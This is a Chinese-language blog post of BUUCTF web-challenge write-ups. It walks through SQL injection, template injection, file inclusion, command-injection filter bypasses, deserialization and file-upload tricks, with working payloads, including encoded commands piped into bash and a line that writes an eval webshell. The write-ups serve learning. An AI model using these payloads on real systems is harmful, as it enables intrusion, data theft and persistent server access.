
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BUUCTF - Guoyanan</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="Expect Us,1、HCTF2018 Warm up开始点进去是一张图片，F12发现有一个“source.php”,于是在URL里输入。
得到PHP代码，显然是一道代码审计题
先看主体，

要关注的就是类里面的函数,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="Guoyanan" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="loading">
    <span id="config-title" style="display:none">Guoyanan</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">BUUCTF</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">BUUCTF</h1>
        <div class="stuff">
            <span>六月 23, 2020</span>
            

        </div>
        <div class="content markdown">
            <h2 id="1、HCTF2018-Warm-up"><a href="#1、HCTF2018-Warm-up" class="headerlink" title="1、HCTF2018 Warm up"></a>1、HCTF2018 Warm up</h2><p><strong>开始点进去是一张图片，F12发现有一个“source.php”,于是在URL里输入。</strong></p>
<p><strong>得到PHP代码，显然是一道代码审计题</strong></p>
<p><strong>先看主体，</strong></p>
<p><img src="https://s1.ax1x.com/2020/06/23/NU70qf.md.png" alt=""></p>
<p><strong>要关注的就是类里面的函数返回值是否为1；</strong></p>
<p><img src="https://s1.ax1x.com/2020/06/23/NU7bW9.md.png" alt=""></p>
<p><strong>分析这个类：</strong></p>
<p><strong>首先，可以知道目录下有两个文件，source.php和hint.php,我先查看下hint.php;</strong></p>
<p><img src="https://s1.ax1x.com/2020/06/23/NUHcTO.md.png" alt=""></p>
<p><strong>这说明flag应该在一个叫ffffllllaaaagggg的文件里，我们还是先看代码。</strong></p>
<p><strong>重点关注in_array函数，因为传入的实参数FILE（是一个文件），要被包含在这两个PHP文件的数组中，所以FILE的值肯定包含一个source.php  或  hint.php;可以先给它赋值file=source.php,我们再接着看，是对传形参page处理后赋值给 _page，再判断是否存在，这个mb_substr一部分的意思实际上就是把file中第一个问号之前的值，截取赋值。</strong></p>
<p><strong>然后是一个urldecode，’?’的编码是%3f,也就是说，如果正常来看，我们把file赋值source.php%3f后，它解码后会变成source.php?,<code>(这里有一个比较冷的知识，因为题目环境是Linux的服务器，在Linux环境下，文件夹的名字是可以带问号的，所以%3f即可。但如果环境是Windows的话就必须二次编码了，即source.php%253f)</code></strong></p>
<p><strong>审计完，其实大意就是让传一个FILE=source.php%3f/…../，但是又要涉及ffffllllaaaagggg这个文件，文件夹里怎么包含文件？。其实这就是%3的作用，<code>它让url以为这是一个文件夹而不是文件，但因为本来没有这个目录，所以系统会忽略它，再模拟创建一个目录，再向上穿透！！如果是xxx.php?的话，就无法识别。当然，其实任意目录名都可以让它发生穿透（除了文件名）</code></strong></p>
<p><strong>最后，我们可以试试不同路径。已知目录名为source.php%3f,我们构造GET请求，从  source.php%3f/../ffffllllaaaagggg开始试，一直到/../../../../，就成功了！</strong></p>
<h2 id="2、随便注"><a href="#2、随便注" class="headerlink" title="2、随便注"></a>2、随便注</h2><p><strong>看见了一个可以提交数据的框，应该是SQL注入，点击一下，果然是</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYF71H.md.png" alt=""></p>
<p><strong>输入2，再查询一下,有反馈</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYkU8e.md.png" alt=""></p>
<p><strong>输入3,4等数，没有回显，说明字段应该是两个（或者ORDER BY）</strong></p>
<p><strong>发现#并没有被过滤</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYAtZq.md.png" alt=""></p>
<p><strong>然后开始常规操作。如果你尝试采用UNION注入的话，你会发现被过滤了,因此要采用堆叠注入</strong></p>
<p><strong>把数据库，表名都显现出来</strong>：</p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYA5Se.md.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYAqTP.md.png" alt=""></p>
<p><strong>得到了两个表，下面查下他们的字段</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYELu9.md.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYZfYV.md.png" alt=""></p>
<p><strong>我们发现words表中是二维的，而1919……14表中是一维的，因此默认回显的表是words，但flag字段在1919表中，我们得让该表的flag字段内容回显</strong></p>
<p><strong>把表的名字改一下，即把words改为其它，把1919改为words，再把flag字段改为id</strong></p>
<p><strong><code>输入   1&#39;;rename words to w;rename 1919....14 to words;alter table words change flag id varchar(100);#</code></strong></p>
<p><strong>再输入<code>1&#39; or 1=1#</code>即可得到flag</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYm0Kg.md.png" alt=""></p>
<h2 id="3、EasySQL"><a href="#3、EasySQL" class="headerlink" title="3、EasySQL"></a>3、EasySQL</h2><p><strong>又是一道SQL注入题；先输个1</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UY3mct.png" alt=""></p>
<p><strong>再输入<code>1&#39;</code>，没有回显，说明 ‘ 可能被过滤了</strong></p>
<p><strong>这题很显然也不能采用联合注入，因为你提交的字符串会被当做flag，于是想到堆叠注入，来看下表</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/13/UY3WDK.png" alt=""></p>
<p><strong>发现有一个表应该有flag，但是尝试了几个语句并没法让它打印出表内容。于是搜了下wp，才得知比赛过程中放出了源码。<code>select $_GET[&#39;query&#39;] || flag from flag</code></strong></p>
<p><strong>这句代码就是处理我们提交数据的语句。||在这里是‘或’的用法，那么，怎么才能让该语句执行到后面呢？百度了一下，得知MySQL里有一个<code>sqlmode(是一组mysql支持的基本语法及校验规则)</code>,于是可以通过修改规则来执行语句，sqlmode里有一个<code>PIPES_AS_CONCAT:</code><br> <code>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</code></strong></p>
<hr>
<p><strong>于是我们可以输入<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>,这样系统会先修改规则，再将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起，打印出flag</strong></p>
<h2 id="4、EasySQL-极客大挑战"><a href="#4、EasySQL-极客大挑战" class="headerlink" title="4、EasySQL(极客大挑战)"></a>4、EasySQL(极客大挑战)</h2><p><strong>这题确实够easy，直接admin加万能语句拿到flag</strong></p>
<h2 id="5、Easy-tornado"><a href="#5、Easy-tornado" class="headerlink" title="5、Easy_tornado"></a>5、Easy_tornado</h2><p><strong>看见题目名称，于是去百度了一下tornado，得知其是一个python的模板。当时想的就是模板注入，这也是我第一次接触模板注入。</strong></p>
<p><strong>开始，发现有三个链接。分别看了下，很明显是给的提示</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aifwE6.md.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aifQEV.md.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aiffVP.md.png" alt=""></p>
<p><strong>可以得知以下几点信息，一是 url里，都是filename加一串哈希值。说明等会可能要构造类似结构的payload来访问flag。二是flag在的文件名，肯定有用。三是最后的哈希生成方法，即md5进行加密生成filehash，filename我们已知，但是cookie_secret是不知道的。</strong></p>
<p><strong>当在url里随便输入一些东西，会出现一个打印出error的页面，并且url里显示<code>?msg=Error</code>，这可能就是为什么会联想到模板注入的原因吧。</strong></p>
<p><strong>然后是文件里提示的render，看了下大佬的解释，得知这是一个用来渲染的函数，可以用不同的参数来访问网页。而在tornado中，可以用&amp;#123&amp;#1235&amp;#125&amp;#12来访问网页。例如构造&amp;#123&amp;#1231&amp;#125&amp;#125，页面返回1</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/ai4ynA.md.png" alt=""></p>
<p><strong>因为只差cookie_secret的值，所以要利用msg去获取，看了大佬的wp，得知可以用handle.settings来显示cookie。Handler是Tornado的一个对象。<code>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象</code>Handler指向处理当前这个页面的RequestHandler对象,而RequestHandler.settings又指向self.application.settings,所以handler.settings就指向RequestHandler.application.settings了（不太懂，先留着，以后再学习）</strong></p>
<p><strong>所以构造<code>?msg=</code>&amp;#123&amp;#123<code>handler.settings</code>&amp;#125&amp;#125`</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aiHA6U.md.png" alt=""></p>
<p><strong>得到cookie（不同的实例是不一样的）</strong></p>
<p><strong>然后是加密。。。用在线工具试了几次，filehash就是不对。于是改用自己写的脚本</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aiHIjU.png" alt=""></p>
<p><strong>python3里的hashlib 模块含有md5函数。最后得到hash值。构造payload<code>file?filename=/f..g&amp;filehash=e9bc....f9</code>得到flag</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aiqRS0.md.png" alt=""></p>
<h2 id="6、Havefun"><a href="#6、Havefun" class="headerlink" title="6、Havefun"></a>6、Havefun</h2><p><strong>这题先F12，发现一句PHP代码在注释里，要用GET提交一个cat变量，若cat值为dog，就打印flag。于是，构造<code>?cat=dog</code>即可</strong></p>
<h2 id="7、Easy-Calc"><a href="#7、Easy-Calc" class="headerlink" title="7、Easy_Calc"></a>7、Easy_Calc</h2><p><strong>进去之后是一个计算器，输入1，就返回1，输入一个运算式，就给出结果。</strong></p>
<p><strong>开始以为它是跟SQL注入相关的题目，在尝试了多个语句后发现行不通，可能是别的相关题型，然后也没有啥思路，就看了部分wp，发现有一个calc.php可以访问。至于为啥能想到呢，可能是大佬的经验和直觉吧</strong></p>
<p><strong>但后来又想了想，一般的网站是会有index.php可以访问的，但这个网站的index访问不了，所以可能会隐藏一些相关的php</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/26/aphi2n.md.png" alt=""></p>
<p><strong>可以看见，在这里给出了过滤的规则，首先在这个页面用GET（一定是在这个页面提交，之前在上一级提交，试了半天没有回显。。。）提交一个num，num的值不能含有这一系列字符。最后用eval去执行echo num的语句，但是我们可以在num后添加‘  ；’来执行其它的代码</strong></p>
<p>*<em>但是，如果你提交<code>?num=1;xxxxxx;</code>会显示页面不存在。所以这应该是waf的功能，只能让你给num赋值数字，那怎么办呢？这里要涉及PHP的字符解析规则了。PHP在解析时会将所有参数替换为有效变量名，例如会删除空白符。因此，可以用  <code>num</code>代替<code>num</code>，前者多了一个空格，waf把这个变量当做  <code>num</code> 而不是<code>num</code>，但PHP解析时会把空格删除，因此代码可以正常执行 *</em></p>
<p><strong>首先来看一下根目录下的目录和文件：<code>? num=1;var_dump(scandir(chr(47)));</code>这里由于过滤’/‘，所以把它用chr（47）来替换，用scandir查看，再用var_dump来返回运行结果</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/26/apo4tU.png" alt=""></p>
<p><strong>发现有一个f1agg，可以想到这就是存放flag的目录了。于是查看目录内容，<code>? num=1;var_dump(get_file_contents(chr(47).f1agg));</code>，结果返回错误</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/26/apTKjs.png" alt=""></p>
<p><strong>这让我迷惑了，因为返回的是错误，说明是语法上出了问题，可能跟这个waf有关，于是试了多次，发现，只要file_get_contents里有字母，就会返回错误。那就把字母换成chr，于是，用<code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>，得到flag</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/26/ap7YZt.png" alt=""></p>
<h2 id="8、Secret-File"><a href="#8、Secret-File" class="headerlink" title="8、Secret File"></a>8、Secret File</h2><p><strong>首先F12，发现有一个<code>./Archive_room.php</code>的页面，于是进入这个页面，发现有一个可以点击的按钮，点击之后，屏幕会闪一下，再跳转到另一个end.php页面。说明信息就藏在一闪而过的画面中。于是抓包，得到一个secr3t.php的线索</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aPZJvF.md.png" alt=""></p>
<p><strong>在初始页面进入secr3t.php的页面，发现了信息，flag在flag.php里，那么就要用这个GET变量$file构造payload去访问flag.php。</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aPeQqH.md.png" alt=""></p>
<p><strong>根据条件语句中的信息，可以知道file中不能含这些字符，而input,data，../立刻给出了提示，也就是PHP伪协议，可以通过伪协议去<code>绕过</code>，从而访问或上传文件，能否使用某些协议取决于php.ini文件(PHP的配置文件，可用<code>phpinfo()</code>查看)中的include指令参数以及php版本等设置</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aPeNz8.png" alt=""></p>
<p><strong>要从服务器上访问一个文件，就要用到filter协议。<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>，就能打印出该文件内容的base64编码后的内容。再用base64解码得到flag</strong></p>
<p><img src="https://s1.ax1x.com/2020/07/27/aPm16U.png" alt=""></p>
<h2 id="9、LoveSQL"><a href="#9、LoveSQL" class="headerlink" title="9、LoveSQL"></a>9、LoveSQL</h2><p><strong>又是一道SQL注入题，先尝试一下</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaSZa4.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aa9XqK.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aa9gvq.png" alt=""></p>
<p><strong>如果用户名是admin或万能密码，那么最后都只会显示登陆成功，得不到什么有用信息。</strong></p>
<p><strong>那就用联合注入，从<code>1&#39; union select 1#</code>试到<code>1&#39; union select 1,2,3#</code>,发现有3个字段</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaCPxI.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaCVZ8.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaCMzn.png" alt=""></p>
<p><strong>而且会发现，在查询语句中的第二个字段的结果会有回显，就在Hello后面，于是我们可以利用这一点去注入</strong></p>
<p><strong>先看下数据库，<code>1&#39; union select 1,database(),3 #</code></strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaCJdU.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaCDL6.png" alt=""></p>
<p><strong>得到库为geek，再爆表：<code>1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema =&#39;geek&#39; #</code></strong></p>
<p><strong>information_schema是一个特殊的库，存储了元数据，包含所有库，表，段的信息，在这个库的tables表里存储着表的信息，我们查询这个表里所在库为geek的表的表名，得到两个</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaC2JH.png" alt=""></p>
<p><strong>由于题目名字为lovesql，联想到第二个表应该是由flag的表，（当然，也可以一个一个试）。由于不知道字段，我们来爆字段。<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;l0vesq1&#39; #</code></strong></p>
<p><strong>我们可以通过这种方法得到字段，当然，我们也可以猜。一般的表会有一个id字段，而这个数据库里很明显要存储用户名和密码，那么自然就是username和password。这也正好是三个字段。</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaC7TS.png" alt=""></p>
<p><strong>最后，查询：<code>1&#39; union select 1,group_concat(id,&#39;,&#39;,password,&#39;,&#39;,username),3 from l0vesq1#</code>，查看页面源代码，得到flag</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/aaCxO0.png" alt=""></p>
<h2 id="10、admin"><a href="#10、admin" class="headerlink" title="10、admin"></a>10、admin</h2><h2 id="11、Inlcude"><a href="#11、Inlcude" class="headerlink" title="11、Inlcude"></a>11、Inlcude</h2><p><strong>这题考察php伪协议绕过。用filter伪协议去构造payload，将返回的Base64编码解码即可</strong></p>
<p><strong><code>/?file=php://filter/convert.base64-encode/resource=flag.php</code></strong></p>
<p><img src="https://s1.ax1x.com/2020/08/04/awiuDI.png" alt=""></p>
<h2 id="12、Ping-Ping-Ping"><a href="#12、Ping-Ping-Ping" class="headerlink" title="12、Ping Ping Ping"></a>12、Ping Ping Ping</h2><p><strong>首先看见页面里有一个<code>/?ip=</code>，很明显是提示用GET去提交ip，于是先试一下127.0.0.1</strong></p>
<p><strong>回显里ip后面有一串数据，可以联想到用’|’去执行linux命令。（攻防世界新手区的一道题类似）。于是先用<code>?ip=127.0.0.1|ls</code>。发现有一个flag.php</strong></p>
<p><strong>当然先要试试直接读flag.php，<code>|cat flag.php</code>，发现空格不被允许，又试了试，发现flag这个完整的字符串也不被允许，那么就是考察绕过的知识了</strong></p>
<p><strong>命令分隔符:<code>linux中: %0a(换行) 、 %0d（回车） 、 ; 、 &amp;   、 | 、 &amp;&amp; 、 ||</code></strong></p>
<p><strong><code>windows中：%0a、&amp;、|、%1a</code></strong></p>
<p><strong>拼接绕过:<code>$a=l;$b=s;$a$b</code></strong></p>
<p><strong>编码绕过:</strong></p>
<p><strong>①base64</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|base64 -d 其将会打印123</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Y2F0IC9mbGFn"</span>|base64 -d|bash     ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p><strong>②hex</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"636174202f666c6167"</span> | xxd -r -p|bash      ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p><strong>③oct</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>) ==&gt;ls</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>)     ==&gt;cat /flag</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>&#125;|\<span class="variable">$0</span>     ==&gt;cat /flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span></span><br><span class="line"><span class="variable">$&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125;</span> &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>



<p><strong>内联执行，以某一个指令的输出结果作为另一个指令的输入项：</strong></p>
<p><code>cat$IFS&#39;ls&#39; // &#39;&#39;为反引号</code>         <code>cat$IFS$(ls)</code></p>
<p><strong>单引号和双引号绕过</strong><br> <code>ca&#39; &#39;t flag</code> 或<code>ca&quot; &quot;t flag</code><br><strong>反斜杠绕过</strong><br><code>ca\t fl\ag</code></p>
<p><strong>回显不能有空格,<code>空格绕过一般是：%20 、 $IFS 、 ${IFS} 、 $IFS$一位数字</code></strong></p>
<p><strong>但是不同情况下可能依然会有的不通过，在这里只有$IFS$x可以通过</strong></p>
<p><strong>flag可以用变量拼接的方式绕过。例如<code>a=g;cat$IFS$1fla$a.php</code></strong></p>
<p><strong>拼接</strong><br> <code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code><br> <strong>编码</strong><br> <code>/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
<p><strong>内联</strong><br> <code>/?ip=127.0.0.1;cat$IFS$9ls</code></p>
<p><strong>最后F12查看flag，flag居然隐藏在注释里面。。。一开始还以为我错了</strong></p>
<p><strong>（以下是所有文件的内容<code>?ip=127.0.0.1;cat$IFS$9&#39;ls&#39;）// &#39;&#39;实则为反引号</code></strong></p>
<p><img src="https://s1.ax1x.com/2020/08/03/ad8yyq.png" alt=""></p>
<h2 id="13、PHP"><a href="#13、PHP" class="headerlink" title="13、PHP"></a>13、PHP</h2><p><strong>拿到题后什么也没有，估计是后台有什么PHP文件用来审计。于是扫描了一下，没有收获。后来看了一下wp，得知有一个<code>www.zip</code>，（又积累了一个点，类似还有<code>www.tar.gz</code>），于是访问得到三个PHP文件</strong></p>
<p><strong>上核心代码</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/05/ayAeZF.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2020/08/05/ayAYZD.png" alt=""></p>
<p><strong>这是一道反序列化题目，通过select提交一个序列化的类来执行类里面的方法。看看类里面，一共两个私有属性，其中__destruct方法可以获取flag，但前提是满足username===”admin”&amp;&amp;password=100的条件。于是我先提交了</strong></p>
<p><strong><code>?select=O:4:&quot;Name&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:100;}</code>，但是回显显示我错了。想了想发现一个问题：这两个属性是私有的，要用不同的形式，于是改成</strong></p>
<p><strong><code>?select=O:4:&quot;Name&quot;:2{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code>，然而还是错误！这是为什么呢？仔细观察发现，类里面还有一个 wakeup魔术方法，在序列化之后被调用，也就是说，我们得绕过它的作用，否则就会导致username被更改，绕过它的方法是：把属性个数改成大于本来个数，这样就绕过了</strong></p>
<p><strong><code>?select=O:4:&quot;Name&quot;:3{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></strong></p>
<p><img src="https://s1.ax1x.com/2020/08/05/ayZpIe.png" alt=""></p>
<h2 id="14、Knife"><a href="#14、Knife" class="headerlink" title="14、Knife"></a>14、Knife</h2><p><strong>明显的一句话木马漏洞，用antsword构造密码为Syc的payload，提交后，在根目录下发现一个flag文件，打开得到flag</strong></p>
<h2 id="15、HTTP"><a href="#15、HTTP" class="headerlink" title="15、HTTP"></a>15、HTTP</h2><p><strong>查看页面源代码（最好不要用F12，容易漏掉重要信息），发现有一个Secret.php,访问之后，有一句<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>,说明这是页面来源要指定的url，于是想到http消息头里的Referer，指定页面来源，将其添加后，又说浏览器是Syclover，于是在User-Agent里，将其改成<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Syclover</code>,指定了浏览器，最后是一个XFF头，设为127.0.0.1即可</strong></p>
<h2 id="16、Exec"><a href="#16、Exec" class="headerlink" title="16、Exec"></a>16、Exec</h2><p><strong>这题又是常见的ping类型题目。不多说，直接<code>127.0.0.1|ls -lah /</code>，得到根目录下所有文件和文件夹，其中有一个flag。</strong></p>
<p><strong>开始以为它是一个文件夹，试了半天，（以为它过滤了关键字，试了好多过滤的方法都不行，才开始怀疑自己的思路是不是错的）后来突然看了看属性，发现它是-rw-r–r–，没有d，说明是一个文件，所以直接<code>127.0.0.1|cat /flag</code>得到flag</strong></p>
<h2 id="17、CheckIn"><a href="#17、CheckIn" class="headerlink" title="17、CheckIn"></a>17、CheckIn</h2><p><strong>这道题是一道文件上传的题目。一开始先试着上传一下</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/14/d9bl5D.png" alt=""></p>
<p><strong>上传一个图片马试试，发现有这样一句话，开始没明白是干啥的，后来看了wp才恍然大悟，是说内容里有<code>&lt;?</code>，也就是对PHP马做出了限制</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/14/d9bjIO.png" alt=""></p>
<p><strong>然后又用phtml的语法上传一个图片马，发现对文件头有要求，于是加上<code>GIF89a</code>文件头。但是还是不行</strong></p>
<p><strong>附上源码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class="line"> </span><br><span class="line">if (isset($_POST[&quot;upload&quot;]))</span><br><span class="line"> &#123;</span><br><span class="line">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name)</span><br><span class="line">   &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name)</span><br><span class="line">   &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    &#x2F;&#x2F;获取后缀名</span><br><span class="line">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension))</span><br><span class="line">   &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;</span><br><span class="line">        正则过滤 .htacess ,各种php类型，有了一个“i”连大小写绕过都不行</span><br><span class="line">    &#x2F;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">   &#123;</span><br><span class="line">        die(&quot;&lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;</span><br><span class="line">        过滤了 &quot; &lt;? &quot; ,这个加上上面一条过滤，htacess的图片马和一句话基本都挂了</span><br><span class="line">    &#x2F;</span><br><span class="line">    $image_type &#x3D; exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type)</span><br><span class="line">  &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;</span><br><span class="line">        要修改一下 “Content-Type”的值</span><br><span class="line">   &#x2F;</span><br><span class="line">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里要用到<code>.user.ini</code>文件，它是一个配置文件，具体可见于我的 “文件上传漏洞” 一文。在.user.ini文件中插入<code>auto_prepend_file=&#39;1.jpg&#39;</code>,就相当于在每个我们要打开得PHP文件前加了一句require，也就是包含了1.jpg这个文件，既然包含了，就可以让文件去执行里面的木马了</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/14/d9jw9O.png" alt=""></p>
<p><strong>再上传一个名为1.jpg的图片马，就可以用蚁剑去链接了。url为<code>http://cbd68a20-0c09-45ac-b441-9c395e563dea.node3.buuoj.cn/uploads/04b0951938d905b41348c1548f9c338b/index.php</code></strong></p>
